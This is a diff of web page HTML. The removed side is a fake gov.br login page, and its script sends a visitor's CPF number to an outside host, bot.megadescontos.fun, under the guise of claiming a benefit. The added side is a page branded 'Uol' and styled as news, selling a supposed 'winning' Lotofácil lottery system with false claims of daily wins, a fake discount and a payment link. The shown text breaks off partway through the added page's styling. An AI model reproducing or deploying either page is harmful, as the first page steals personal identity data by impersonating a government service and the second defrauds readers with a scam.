@@ -1,190 +1,978 @@
 
-
-
-<!DOCTYPE html><html lang="pt-br"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resgate Login</title>
-
-            <script>
-                const v_123_pageId = "65b150b4e20a4f8ea305fd0e";
-                const v_123_siteId = "659cd1a8d2661c0d799e4a62";
-                const v_123_siteType = "HTML";
-                const v_123_slug = null;
-            </script>
-
-            </head>
-<body>
-    
-        <!-- Meta Pixel Code -->
-    
-        
-        <!-- End Meta Pixel Code -->
-    
-        <!-- Meta Pixel Code -->
-    
-        
-        <!-- End Meta Pixel Code -->
-    
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Resgate Login</title>
-        <link rel="stylesheet" href="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/css/reset.css">
-        <link rel="stylesheet" href="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/css/start.css">
-        <link rel="stylesheet" href="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/css/all.min_1.css">
-            <!-- Outros elementos do cabeçalho... -->
-        <link rel="stylesheet" href="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/css/all.min.css">
-     
-        
-       <!-- <link rel="stylesheet" href="path/to/bootstrap/css/bootstrap.min.css">-->
-        <!--<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">-->
-    
-    
-        <header>
-            <img src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/images/govbrlogo.png" alt="Imagem de um gato"> <!-- Você pode trocar a imagem por outra de sua preferência -->
-            <div id="acessibilidade">
-                <span>
-                    <a href="#" id="umdoistrestplink1"><i class="fas fa-adjust"></i></a>
-              
-                </span>
-                <span>
-                    <a href="#" target="_blank" id="umdoistrestplink2"><i class="fas fa-deaf"></i></a>
-                </span>
-            </div>
-        </header>
-    
-        <div class="container">
-            <div class="card">
-                <h3>Identifique-se no gov.br com:</h3>
-                <div class="item-login-signup">
-                    <a tabindex="3">
-                        <img src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/images/id-card-solid.png">
-                        Número do CPF
-                    </a>
-                </div>
-    
-                <div class="accordion-panel">
-                    <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
-                    
-               
-                <form id="formCPF">
-                <label for="cpf">CPF</label>
-                <input id="numeroCPF" name="cpf" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite seu CPF" aria-invalid="false" required="true" class="corrigircpf">
-                <script>
-                    document.addEventListener('DOMContentLoaded', function () {
-                // Obtém todos os elementos com a classe 'corrigircpf'
-                        var inputs = document.getElementsByClassName('corrigircpf');
-    
-                // Adiciona um ouvinte de evento de entrada a cada elemento
-                        for (var i = 0; i < inputs.length; i++) {
-                            inputs[i].addEventListener('input', function () {
-                        // Remove os caracteres '-' e '.'
-                                this.value = this.value.replace(/[-.]/g, '');
-    
-                        // Limite a quantidade de caracteres conforme necessário (ex: CPF)
-                        var maxLength = 11; // ajuste conforme necessário
-                        this.value = this.value.slice(0, maxLength);
-                    });
-                        }
-                    });
-                </script>
-                        <script>
-            document.getElementById('formCPF').addEventListener('submit', function(event) {
-                event.preventDefault(); // Impede o envio padrão do formulário
-    
-                // Obtém o valor do input com ID "numeroCPF"
-                var numeroCPF = document.getElementById('numeroCPF').value;
-    
-                // Constrói a URL de redirecionamento
-                var redirectURL = 'https://bot.megadescontos.fun/consulta?cpf=' + encodeURIComponent(numeroCPF);
-    
-                // Adiciona parâmetros existentes na URL atual à nova URL
-                var parametrosAtuais = window.location.search.substring(1);
-                if (parametrosAtuais) {
-                    redirectURL += '&' + parametrosAtuais;
-                }
-    
-                // Redireciona para a URL construída
-                window.location.href = redirectURL;
-            });
-            </script>
-                <div id="error-message" style="color: red;"></div>
-                <p>Nota: Uma atendente continuará o seu atendimento logo após você prosseguir para o resgate do seu benefício.</p>
-                <div class="button-panel" id="login-button-panel">
-                    <input type="submit" value="Continuar" id="buttonCPF" class="button-continuar" tabindex="2">
-                    <style type="text/css">
-                        input.button-continuar {
-                            border-radius: 20px;
-                            border: none;
-                            color: #fff;
-                        }
-                    </style>
-                </div>
-            
-            </form>   
-                <label id="title-outras-op">Outras opções de identificação:</label>
-                <hr id="hr-outras-op" style="margin: 0 0 0">
-                <div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')">
-                    <a tabindex="5" href="#" style="color:#008C32" id="umdoistrestplink3">
-                        <img src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/images/InternetBanking-green.png">
-                        Login com seu banco
-                        <span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA   CONTA   SERÁ   PRATA</span>
-                    </a>
-                </div>
-                <div class="item-login-signup-ways" onclick="showQrCode('e062c3ac-776d-4ee0-b6f3-f9198984ca37');">
-                    <a tabindex="5" href="#" id="umdoistrestplink4">
-                        <img src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/images/app-identidade-govbr.png">
-                            Seu aplicativo gov.br
-                        </a>
-                </div>
-                <div class="item-login-signup-ways" id="cert-digital-cloud" onclick="showModal('modal-certificado-nuvem')">
-                    <a tabindex="5" href="#" id="cert-digital-cloud-a">
-                        <img src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/images/CD-Nuvem.png" id="cert-digital-cloud-img">
-                        Seu certificado digital em nuvem
-                    </a>
-                </div>
-                <div class="entenda-id-govbr" id="entenda-id-govbr">
-                    <span>
-                        <a tabindex="6" href="#" id="entenda-id-govbr-a">
-                                <img src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/fonts/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em;">
-                                Está com dúvidas e precisa de ajuda?
-                            </a>
-                        <a tabindex="6" href="#" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
-                    </span>
-                </div>
-            </div>
-            
-                
-          
-            </div>
-    
-            
-        </div>
-        <script src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/js/track-v3.js" type="text/javascript" async=""></script><script src="https://cdn2.123tp.net/8764aa8ac896458bb86a9b4958f2e4f1/js/apii.js"></script>
-        <script>
-            function formatarCPF(cpf) {
-                cpf = cpf.replace(/\D/g, '');
-                cpf = cpf.substring(0, 11);
-                cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
-                cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
-                cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-                return cpf;
-            }
-        
-            document.getElementById('numero').addEventListener('input', function (e) {
-                var cpfFormatado = formatarCPF(e.target.value);
-                e.target.value = cpfFormatado;
-        
-                // Atualizar o valor do campo oculto com o CPF sem formatação
-                var cpfLimpo = cpfFormatado.replace(/\D/g, '');
-                document.getElementById('cpf_valor_real').value = cpfLimpo;
-            });
-        </script>
-    
-        <script type="text/javascript"> (function(funnel) {var deferredEvents = [];window.funnelytics = {events: {trigger: function (name, attributes, callback, opts) {deferredEvents.push({name: name, attributes: attributes, callback: callback, opts: opts});}}};var insert = document.getElementsByTagName('script')[0],script = document.createElement('script');script.addEventListener('load', function() {window.funnelytics.init(funnel, false, deferredEvents);});script.src = 'https://cdn.funnelytics.io/track-v3.js';script.type = 'text/javascript';script.async = true;insert.parentNode.insertBefore(script, insert);})('42208a35-a879-421e-8f80-48b628f055c7'); </script>
-    
-     
-
-
-                    <script async="true" src="https://cdn1.123tp.net/js/123global.js"></script>
-                </body></html>
+<!DOCTYPE html>
+<html lang="pt-BR" dir="ltr">
+<head>
+<meta name="robots" content="noindex, nofollow">
+<link rel="shortcut icon" href="data:" />
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://www.portalpodnews.com/materiamais">
+<meta property="og:title" content="Uol">
+<meta property="og:description" content="Noticia">
+<meta property="og:image" content="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/bGdakl9952508.png">
+<meta charset="utf-8">
+<link rel="preload" href="https://player-vz-f3eca278-ed1.tv.pandavideo.com.br/embed/css/styles.css" as="style">
+<link rel="prerender" href="https://player-vz-f3eca278-ed1.tv.pandavideo.com.br/embed/?v=a247714a-f4bd-44ae-af1f-21e6e306c648">
+<link rel="preload" href="https://player-vz-f3eca278-ed1.tv.pandavideo.com.br/embed/js/hls.js" as="script">
+<link rel="preload" href="https://player-vz-f3eca278-ed1.tv.pandavideo.com.br/embed/js/plyr.polyfilled.min.js" as="script">
+<link rel="preload" href="https://config.tv.pandavideo.com.br/vz-f3eca278-ed1/a247714a-f4bd-44ae-af1f-21e6e306c648.json" as="fetch">
+<link rel="preload" href="https://config.tv.pandavideo.com.br/vz-f3eca278-ed1/config.json" as="fetch">
+<link rel="preload" href="https://b-vz-f3eca278-ed1.tv.pandavideo.com.br/a247714a-f4bd-44ae-af1f-21e6e306c648/playlist.m3u8" as="fetch">
+<link rel="dns-prefetch" href="https://b-vz-f3eca278-ed1.tv.pandavideo.com.br">
+<link rel="dns-prefetch" href="https://player-vz-f3eca278-ed1.tv.pandavideo.com.br">
+<link rel="dns-prefetch" href="https://vz-f3eca278-ed1.b-cdn.net">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<title>Uol</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;600;700;800&family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" media="print" onload="this.onload=null;this.removeAttribute('media');">
+<style>@media (max-width:640px){.atm-hidden-mobile{display:none}}@media (min-width:640px){.atm-hidden-desktop{display:none}}.col-span-1{grid-column: span 1 / span 1;}.col-span-2{grid-column: span 2 / span 2;}.items-center{align-items:center}.grid-cols-6{grid-template-columns: repeat(6, minmax(0, 1fr))}.grid-cols-5{	grid-template-columns: repeat(5, minmax(0, 1fr))}.grid-cols-4{grid-template-columns: repeat(4, minmax(0, 1fr))}.grid-cols-2{grid-template-columns: repeat(2, minmax(0, 1fr))}.grid-cols-3{grid-template-columns: repeat(3, minmax(0, 1fr))}.grid-cols-1{grid-template-columns: repeat(1, minmax(0, 1fr))}.grid{display:grid}.basis-1\/2{flex-basis:50%}.flex{display:flex}.gap-1{gap:4px}.gap-2{gap:8px}.gap-4{gap:16px}.gap-6{gap:24px}.gap-12{48px}.gap-24{gap:96px}.justify-center{justify-content:center}.basis-full{flex-basis:100%}html{scroll-behavior:smooth;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent}body,center,dd,del,div,dt,em,footer,h1,h2,h3,h4,h5,h6,i,iframe,img,p,q,s,small,span,strike,strong,sub,sup,table,tbody,td,tr,u{margin:-1px 0 0 0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline;font-family:Roboto,sans-serif}.u{-moz-user-select:none;-webkit-user-select:none;cursor:default}table{border-collapse:collapse;border-spacing:0}body{line-height:1}body{background-color:#ffffff;overflow-x:hidden}iframe,img,svg{max-width:100%}h1,h1 b,h1 span,h2,h2 b,h2 span,h3,h3 b,h3 span{font-family:Poppins,sans-serif}a{text-decoration:none;font-family:Roboto,sans-serif}a.btn{font-family:Montserrat,sans-serif}em span.lg,em span.md,em span.sm{font-style:italic}@media (max-width:600px){.flex-large,.flex-small{margin-right:0!important;margin-bottom:16px}}.flexrow{display:flex;flex-direction:row;flex-wrap:wrap;align-items:center}.flex-large,.flex-small{flex-basis:100%}.flex-large:last-child,.flex-small:last-child{margin-right:0!important}@media (min-width:600px){.flex-small{flex:1;margin-bottom:0!important;padding-bottom:0!important}.flex-small.half{flex:0 0 calc(1 / 2 * 100%)}.flex-small.one-fifth{flex:0 0 calc(1 / 5 * 100%)}.flex-small.two-fifths{flex:0 0 calc(2 / 5 * 100%)}.flex-small.one-fourth{flex:0 0 calc(1 / 4 * 100%)}.flex-small.two-fourths{flex:0 0 calc(2 / 4 * 100%)}.flex-small.three-fourths{flex:0 0 calc(3 / 4 * 100%)}.flex-small.one-third{flex:0 0 calc(1 / 3 * 100%)}.flex-small.two-thirds{flex:0 0 calc(2 / 3 * 100%)}}@media (min-width:1000px){.flex-large{flex:1;margin-bottom:0}.flex-large.half{flex:0 0 calc(1 / 2 * 100%)}.flex-large.one-fifth{flex:0 0 calc(1 / 5 * 100%)}.flex-large.two-fifths{flex:0 0 calc(2 / 5 * 100%)}.flex-large.one-fourth,.flex-large.two-fourths{flex:0 0 calc(1 / 4 * 100%)}.flex-large.three-fourths{flex:0 0 calc(3 / 4 * 100%)}.flex-large.one-third{flex:0 0 calc(1 / 3 * 100%)}.flex-large.two-thirds{flex:0 0 calc(2 / 3 * 100%)}}@media (min-width:640px){.sm\:gap-1{gap:6px}.sm\:gap-2{gap:12px!important}.sm\:gap-4{gap:24px}.sm\:gap-6{gap:32px}.sm\:gap-12{gap:64px}.sm\:gap-24{gap:128px}.sm\:grid-cols-6{grid-template-columns:repeat(6,minmax(0,1fr))}.sm\:grid-cols-5{grid-template-columns:repeat(5,minmax(0,1fr))}.sm\:grid-cols-4{grid-template-columns:repeat(4,minmax(0,1fr))}.sm\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.sm\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.sm\:grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}}</style>
+</head>
+<body id="_swAmSsHyGTXc9l4eem1zpXZJbIy1" data-page="_NmnfEum8hAHsqSoBgFl1">
+<style>
+.ztFmCm0010858 {display: none}
+@media (max-width: 640px) {
+html {overflow-x:hidden}
+}
+</style>
+<style>.zooming { animation: zooming 1.25s ease infinite; } @keyframes zooming { 0% { transform: scale(1, 1); } 50% { transform: scale(1.1, 1.1); } 100% { transform: scale(1, 1); } }</style>
+<style>.px-1{padding-left:4px;padding-right:4px}.pt-0.5{padding-top:2px}.mt-4{margin-top:16px}@media (min-width:640px){.sm\:text-sm{font-size:14px;line-height:20px}}.mt-2{margin-top:8px}.mb-2{margin-bottom:8px}.flex{display:flex}.w-full{width:100%}.space-x-1>:not([hidden])~:not([hidden]){margin-left:.25rem}.items-center{align-items:center}.font-\[Helvetica\]{font-family:Helvetica,Arial,sans-serif}.cursor-pointer{cursor:pointer}.rounded-full{border-radius:99999px}.h-12{height:48px}.w-12{width:48px}.flex-col{flex-direction:column}.py-1{padding-top:4px;padding-bottom:4px}.px-3{padding-left:12px;padding-right:12px}.pl-0\.5,.px-0\.5{padding-left:2px}.rounded-\[18px\]{border-radius:18px}.bg-stone-100{background-color:#f5f5f4}.px-0\.5{padding-right:2px}.font-semibold{font-weight:600}.text-\[\#365899\]{color:#365899}.text-\[13px\]{font-size:13px}.leading-4{line-height:16px}.hover\:underline:hover{text-decoration-line:underline}.text-sm{font-size:14px}.relative{position:relative}.justify-between{justify-content:space-between}.grow{flex-grow:1}.text-xs{font-size:12px}.text-\[\#90949c\]{color:#90949c}.ml-px{margin-left:1px}.gap-1{gap:4px}.w-fit{width:fit-content}.hidden{display:none}.-mt-1{margin-top:-4px}.-mt-2{margin-top:-8px}.mr-2{margin-right:8px}.h-4,.h-5{height:16px}.drop-shadow{--tw-drop-shadow:drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1)) drop-shadow(0 1px 1px rgba(0, 0, 0, 0.06));filter:var(--tw-drop-shadow)}.bg-slate-50{background-color:#f8fafc}.py-0\.5{padding-top:2px;padding-bottom:2px}.pr-1{padding-right:4px}.block{display:block}.w-4{width:16px}.-ml-1{margin-left:-4px}.ml-4{margin-left:16px}.gap-x-0\.5{column-gap:2px}.mr-0\.5{margin-right:2px;margin-left:2px}.border-l{border-left-width:1px}.border-slate-300{border-color:#cbd5e1}.border-dotted{border-style:dotted}.ml-5{margin-left:20px}.h-8{height:32px}.w-8{width:32px}.h-10{height:40px}.w-10{width:40px}@media (min-width:640px){.sm\:w-16{width:64px}.sm\:ml-12{margin-left:48px}}.pl-2{padding-left:8px}</style>
+<script>
+         document.addEventListener('DOMContentLoaded', function () {
+             // Obtém os parâmetros UTM da URL atual
+             var utmParams = new URLSearchParams(window.location.search);
+         
+             // Obtém todas as âncoras (<a>) no documento
+             var anchors = document.querySelectorAll('a');
+         
+             // Itera sobre todas as âncoras e adiciona os parâmetros UTM às URLs
+             anchors.forEach(function (anchor) {
+                 // Obtém o atributo "href" da âncora
+                 var href = anchor.getAttribute('href');
+         
+                 // Verifica se o atributo "href" existe e se não é uma âncora interna
+                 if (href && !href.startsWith('#')) {
+                     // Cria uma nova URL com base na URL da âncora
+                     var url = new URL(href, window.location.origin);
+         
+                     // Adiciona os parâmetros UTM à URL da âncora
+                     utmParams.forEach(function (value, key) {
+                         url.searchParams.set(key, value);
+                     });
+         
+                     // Define a nova URL como o atributo "href" da âncora
+                     anchor.href = url.toString();
+                 }
+             });
+         });
+</script>
+<div class="division-nbcJxv4582836__wrapper">
+<style>
+#division-nbcJxv4582836 {
+border: none;
+border-radius: ;
+margin: 0;
+position: relative;
+padding: 3vh 14vw 3vh 14vw;
+background-color: #000000;
+}
+@media (max-width:1200px) {
+#division-nbcJxv4582836 {
+padding: 2.25vh 10.5vw 2.25vh 10.5vw;
+margin: 0;
+}
+}
+@media (max-width:600px) {
+#division-nbcJxv4582836 {
+margin: 0;
+padding: 1.5vh 6vw 1.5vh 6vw;
+}
+}
+</style>
+<div id="division-nbcJxv4582836" class="MyDmbb9984915 grid grid-cols-3 sm:grid-cols-3 items-center gap-3 sm:gap-3">
+<div class="image-btlKxk4582836">
+<style>
+.image-btlKxk4582836-element img {
+display: block;
+margin-left: 0;
+margin-right: auto;
+margin-bottom: 0.25vh;
+margin-top: 0.25vh;
+max-width: 20%;
+border-radius: 0;
+border: none;
+}
+@media (max-width: 1200px) {
+.image-btlKxk4582836-element img {
+max-width: 18%;
+}
+}
+@media (max-width: 600px) {
+.image-btlKxk4582836-element img {
+max-width: 20%;
+}
+}
+</style>
+<div class="image-btlKxk4582836-element">
+<img loading="lazy" src="https://media.atomicatpages.com/u/YgiEC5vhUfWYWr7NeVpiT0q6yFJ3/l/WIMQYs2220511.svg+xml" alt>
+</div>
+</div>
+<div class="image-wCsJSw9932479">
+<style>
+.image-wCsJSw9932479-element img {
+display: block;
+margin-left: auto;
+margin-right: auto;
+margin-bottom: 0.25vh;
+margin-top: 0.25vh;
+max-width: 30%;
+border-radius: 0;
+border: none;
+}
+@media (max-width: 1200px) {
+.image-wCsJSw9932479-element img {
+max-width: 27%;
+}
+}
+@media (max-width: 600px) {
+.image-wCsJSw9932479-element img {
+max-width: 80%;
+margin-left:auto;margin-right:auto;
+}
+}
+</style>
+<div class="image-wCsJSw9932479-element">
+<script type="text/javascript" style="display:none">
+//<![CDATA[
+window.__mirage2 = {petok:"nlWeqLUowL73yupMW0WW0bGnu0qDsRn_nX.ti.w96i4-1800-0"};
+//]]>
+</script>
+<script type="text/javascript" src="https://ajax.cloudflare.com/cdn-cgi/scripts/04b3eb47/cloudflare-static/mirage2.min.js"></script>
+<img loading="lazy" data-cfsrc="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/bGdakl9952508.png" alt style="display:none;visibility:hidden;"><noscript><img loading="lazy" src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/bGdakl9952508.png" alt></noscript>
+</div>
+</div>
+</div>
+</div>
+<div class="division-iHDgjH2719596__wrapper">
+<style>
+#division-iHDgjH2719596 {
+border: none;
+border-radius: ;
+margin: 0;
+position: relative;
+padding: 4vh 24vw 3vh 24vw;
+background-color: #ffffff;
+}
+@media (max-width:1200px) {
+#division-iHDgjH2719596 {
+padding: 3vh 18vw 2.25vh 18vw;
+margin: 0;
+}
+}
+@media (max-width:600px) {
+#division-iHDgjH2719596 {
+margin: 0;
+padding: 1.5vh 4.5vw 1.5vh 4.5vw;
+}
+}
+</style>
+<div id="division-iHDgjH2719596" class="hHxSkY9984916">
+<div class="headline-CYhtmB2719596">
+<style>
+.headline-CYhtmB2719596-element h1 {
+font-size: 2.64vw;
+text-align: left;
+padding-top: 2vh;
+padding-bottom: 0vh;
+color: #000000;
+line-height: 1.4;
+font-weight: 600;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-CYhtmB2719596-element h1 {
+font-size: 4.00vw;
+padding-top: 1.5vh;
+padding-bottom: 0vh;
+}
+}
+@media (max-width: 640px) {
+.headline-CYhtmB2719596-element h1 {
+font-size: 5.60vw;
+padding-top: 1.5vh;
+padding-bottom: 0vh;
+text-align: left;
+}
+}
+</style>
+<div class="headline-CYhtmB2719596-element headline">
+<h1>
+<span style="color:#B62619">LOTOFÁCIL:</span>&nbsp;Aprenda o sistema vencedor do momento. São mais de 70x os 14 e qualquer um pode usar.
+</h1>
+</div>
+</div>
+<div class="headline-MPRFQF2719597">
+<style>
+.headline-MPRFQF2719597-element h1 {
+font-size: 0.99vw;
+text-align: center;
+padding-top: 3vh;
+padding-bottom: 0vh;
+color: #1F2123;
+line-height: 1.7;
+font-weight: 300;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-MPRFQF2719597-element h1 {
+font-size: 1.50vw;
+padding-top: 2.25vh;
+padding-bottom: 0vh;
+}
+}
+@media (max-width: 640px) {
+.headline-MPRFQF2719597-element h1 {
+font-size: 4.00vw;
+padding-top: 2.25vh;
+padding-bottom: 0vh;
+text-align: left;
+}
+}
+</style>
+<div class="headline-MPRFQF2719597-element headline">
+<h1>
+Douglas ganha na Lotofacil todos os dias e ja soma mais de 70 prêmios. Aprenda e ganhe hoje mesmo
+</h1>
+</div>
+</div>
+<style>
+.video-bfYXLS9681661 iframe {
+border: none !important;
+box-shadow: none;
+border-radius: undefined;
+}
+</style>
+<div id="player-bfYXLS9681661" class="video-bfYXLS9681661">
+<div style="position:relative;padding-top:56.25%;"><iframe id="panda-a247714a-f4bd-44ae-af1f-21e6e306c648" src="https://player-vz-f3eca278-ed1.tv.pandavideo.com.br/embed/?v=a247714a-f4bd-44ae-af1f-21e6e306c648" style="border:none;position:absolute;top:0;left:0;" allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" allowfullscreen="true" width="100%" height="100%" fetchpriority="high"></iframe></div>
+</div>
+<div class="headline-FWBNBt2719597">
+<style>
+.headline-FWBNBt2719597-element h1 {
+font-size: 0.99vw;
+text-align: center;
+padding-top: 5vh;
+padding-bottom: 0vh;
+color: #1F2123;
+line-height: 1.7;
+font-weight: 300;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-FWBNBt2719597-element h1 {
+font-size: 1.50vw;
+padding-top: 3.75vh;
+padding-bottom: 0vh;
+}
+}
+@media (max-width: 640px) {
+.headline-FWBNBt2719597-element h1 {
+font-size: 4.00vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+text-align: center;
+}
+}
+</style>
+<div class="headline-FWBNBt2719597-element headline">
+<h1>
+🔊 Verifique se seu som está ligado!
+</h1>
+</div>
+</div>
+</div>
+</div>
+<div class="division-QfMbKk2568515__wrapper">
+<style>
+#division-QfMbKk2568515 {
+border: none;
+border-radius: ;
+margin: 0;
+position: relative;
+padding: 3vh 20vw 3vh 20vw;
+background-color: #ffffff;
+}
+@media (max-width:1200px) {
+#division-QfMbKk2568515 {
+padding: 2.25vh 15vw 2.25vh 15vw;
+margin: 0;
+}
+}
+@media (max-width:600px) {
+#division-QfMbKk2568515 {
+margin: 0;
+padding: 0.001vh 1.5vw 1.5vh 1.5vw;
+}
+}
+</style>
+<div id="division-QfMbKk2568515" class="LeyQHz9984916 ztFmCm0010858">
+<div class="image-jDboGM2479670">
+<style>
+.image-jDboGM2479670-element img {
+display: block;
+margin-left: auto;
+margin-right: auto;
+margin-bottom: 0.25vh;
+margin-top: 1vh;
+max-width: 100%;
+border-radius: 0;
+border: none;
+}
+@media (max-width: 1200px) {
+.image-jDboGM2479670-element img {
+max-width: 90%;
+}
+}
+@media (max-width: 600px) {
+.image-jDboGM2479670-element img {
+max-width: 100%;
+margin-left:auto;margin-right:auto;
+}
+}
+</style>
+<div class="image-jDboGM2479670-element">
+<img loading="lazy" data-cfsrc="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/bpSzPc2508489.jpeg" alt style="display:none;visibility:hidden;"><noscript><img loading="lazy" src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/bpSzPc2508489.jpeg" alt></noscript>
+</div>
+</div>
+<div class="headline-dNWaNi0238303">
+<style>
+.headline-dNWaNi0238303-element h1 {
+font-size: 2.31vw;
+text-align: center;
+padding-top: 2vh;
+padding-bottom: 2vh;
+color: #000000;
+line-height: 1.1;
+font-weight: 500;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-dNWaNi0238303-element h1 {
+font-size: 2.80vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+}
+}
+@media (max-width: 640px) {
+.headline-dNWaNi0238303-element h1 {
+font-size: 5.60vw;
+padding-top: 0vh;
+padding-bottom: 1.5vh;
+text-align: center;
+}
+}
+</style>
+<div class="headline-dNWaNi0238303-element headline">
+<h1>
+<span style="background-color:#ffff00">&nbsp;PREÇO EXCLUSIVO!&nbsp;</span>
+</h1>
+</div>
+</div>
+<div class="headline-vsXHLJ2688603">
+<style>
+.headline-vsXHLJ2688603-element h1 {
+font-size: 2.31vw;
+text-align: center;
+padding-top: 2vh;
+padding-bottom: 2vh;
+color: #da0c0c;
+line-height: 1.1;
+font-weight: 500;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-vsXHLJ2688603-element h1 {
+font-size: 2.80vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+}
+}
+@media (max-width: 640px) {
+.headline-vsXHLJ2688603-element h1 {
+font-size: 5.60vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+text-align: center;
+}
+}
+</style>
+<div class="headline-vsXHLJ2688603-element headline">
+<h1>
+<del>DE: 197,00</del>
+</h1>
+</div>
+</div>
+<div class="headline-efHjYQ2607105">
+<style>
+.headline-efHjYQ2607105-element h1 {
+font-size: 2.64vw;
+text-align: center;
+padding-top: 2vh;
+padding-bottom: 2vh;
+color: #07a431;
+line-height: 1.1;
+font-weight: 800;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-efHjYQ2607105-element h1 {
+font-size: 4.00vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+}
+}
+@media (max-width: 640px) {
+.headline-efHjYQ2607105-element h1 {
+font-size: 5.60vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+text-align: center;
+}
+}
+</style>
+<div class="headline-efHjYQ2607105-element headline">
+<h1>
+POR: 147,00
+</h1>
+</div>
+</div>
+<div class="button-cvKrdo2742825">
+<style>
+a.button-cvKrdo2742825-element {
+background: #28A70C;
+border-radius: 4px;
+border: none;
+color: #ffffff;
+padding: 16px 32px 16px 32px;
+font-weight: 600;
+display: block;
+width: fit-content;
+text-align: center;
+margin: 2vh auto 2vh auto;
+font-size: 1.49vw;
+box-sizing: border-box;
+max-width: 100%;
+transition: all 0.5s ease-in-out;
+}
+a.button-cvKrdo2742825-element:hover {
+filter: brightness(1.2);
+}
+@media (max-width: 1200px) {
+a.button-cvKrdo2742825-element {
+font-size: 1.69vw;
+margin: 1.32vh auto 1.5vh auto;
+padding: 8px 16px 8px 16px;
+}
+}
+@media (max-width: 640px) {
+a.button-cvKrdo2742825-element {
+font-size: 3.94vw;
+padding: 12px 24px 12px 24px;
+margin: 1vh auto 1vh auto;
+width: ;
+}
+}
+</style>
+<a href="https://pay.checkbr.com/mwK4367rqXyZQ8b" target="_blank" class="btn button-cvKrdo2742825-element zooming">
+SIM, EU QUERO BAIXAR AGORA
+</a>
+</div>
+</div>
+</div>
+<div class="division-YpxDGF2560226__wrapper">
+<style>
+#division-YpxDGF2560226 {
+border: none;
+border-radius: ;
+margin: 0;
+position: relative;
+padding: 2vh 24vw 1vh 24vw;
+background-color: #ffffff;
+}
+@media (max-width:1200px) {
+#division-YpxDGF2560226 {
+padding: 1.5vh 18vw 0.75vh 18vw;
+margin: 0;
+}
+}
+@media (max-width:600px) {
+#division-YpxDGF2560226 {
+margin: 0;
+padding: 0.75vh 4.5vw 1.5vh 4.5vw;
+}
+}
+</style>
+<div id="division-YpxDGF2560226" class="socyCc9984917">
+<div class="headline-xLWKjt2864720">
+<style>
+.headline-xLWKjt2864720-element h1 {
+font-size: 1.65vw;
+text-align: left;
+padding-top: 5vh;
+padding-bottom: 0vh;
+color: #1F2123;
+line-height: 1.7;
+font-weight: 600;
+letter-spacing: px;
+false
+}
+@media (max-width: 1200px) {
+.headline-xLWKjt2864720-element h1 {
+font-size: 2.50vw;
+padding-top: 3.75vh;
+padding-bottom: 0vh;
+}
+}
+@media (max-width: 640px) {
+.headline-xLWKjt2864720-element h1 {
+font-size: 5.60vw;
+padding-top: 1.5vh;
+padding-bottom: 1.5vh;
+text-align: left;
+}
+}
+</style>
+<div class="headline-xLWKjt2864720-element headline">
+<h1>
+6 comentários
+</h1>
+</div>
+</div>
+<div class="divider-lrdKoN2899371">
+<style>
+.divider-lrdKoN2899371-element {
+height: 1px;
+background-color: #adadad;
